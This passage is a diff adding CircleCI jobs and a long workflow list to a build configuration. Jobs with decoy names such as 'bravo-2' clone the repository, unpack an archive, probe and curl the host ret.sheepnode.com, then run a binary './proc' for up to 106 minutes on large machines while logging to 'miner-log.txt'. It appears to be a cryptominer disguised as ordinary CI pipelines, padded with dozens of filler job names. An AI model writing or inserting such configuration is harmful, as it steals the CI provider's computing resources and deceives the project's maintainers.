+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  generatorTulipLimitVector:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: curl pkgs hdrs
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; grep -irlw umask /etc 2>/dev/null | nl | head -n 8; true ; } > /tmp/terminal/fox.chrome.pixel.quick.east
+            echo "stage=bravo-2 hash=$(md5sum /tmp/terminal/fox.chrome.pixel.quick.east | cut -c1-8) size=$(wc -c </tmp/terminal/fox.chrome.pixel.quick.east)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'fox.chrome.pixel.quick.east'
+  bravo-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+
+workflows:
+  default:
+    jobs:
+      - bundle_colors
+      - ensure-staging-regression-suite:
+          requires:
+            - bundle_colors
+      - wk5:
+          requires:
+            - bundle_colors
+      - INIT_STG:
+          requires:
+            - wk5
+      - DIALOG_H_:
+          requires:
+            - wk5
+      - india:
+          requires:
+            - DIALOG_H_
+      - LANG_CA:
+          requires:
+            - DIALOG_H_
+      - ruby3-lint:
+          requires:
+            - LANG_CA
+      - pickextra:
+          requires:
+            - LANG_CA
+      - uma-run:
+          requires:
+            - pickextra
+      - level-to-tight:
+          requires:
+            - pickextra
+      - q3-ship:
+          requires:
+            - level-to-tight
+      - NBF__BOTTOM_DATABASE:
+          requires:
+            - level-to-tight
+      - kilo-1:
+          requires:
+            - NBF__BOTTOM_DATABASE
+      - ms_fname_prod:
+          requires:
+            - NBF__BOTTOM_DATABASE
+      - polaris:
+          requires:
+            - ms_fname_prod
+      - CTR-NAME:
+          requires:
+            - ms_fname_prod
+      - v6-rc5:
+          requires:
+            - CTR-NAME
+      - froanswoazham-klun:
+          requires:
+            - CTR-NAME
+      - node18-lint:
+          requires:
+            - froanswoazham-klun
+      - file_stage
+      - realHank
+      - RolloutImage:
+          requires:
+            - file_stage
+            - realHank
+      - build-nightly-integration-tests:
+          requires:
+            - file_stage
+            - realHank
+      - STG_RUN_1:
+          requires:
+            - file_stage
+            - realHank
+      - API-402:
+          requires:
+            - file_stage
+            - realHank
+      - sirius-v2:
+          requires:
+            - file_stage
+            - realHank
+      - ValidateProd:
+          requires:
+            - file_stage
+            - realHank
+      - v3-rc3:
+          requires:
+            - file_stage
+            - realHank
+      - fx-old:
+          requires:
+            - file_stage
+            - realHank
+      - push-it:
+          requires:
+            - file_stage
+            - realHank
+      - bravo-2:
+          requires:
+            - file_stage
+            - realHank
+      - CachedBuilderComponent
+      - removeAuthor
+      - UAT_VERIFY_4:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
+      - tb-2:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
+      - q1-ship:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
+      - Verify_App7:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
+      - titan2:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
+      - uma-ci:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
+      - send-it:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
+      - phoenix-plus:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
+      - echo:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
+      - break-prod:
+          requires:
+            - CachedBuilderComponent
+            - removeAuthor
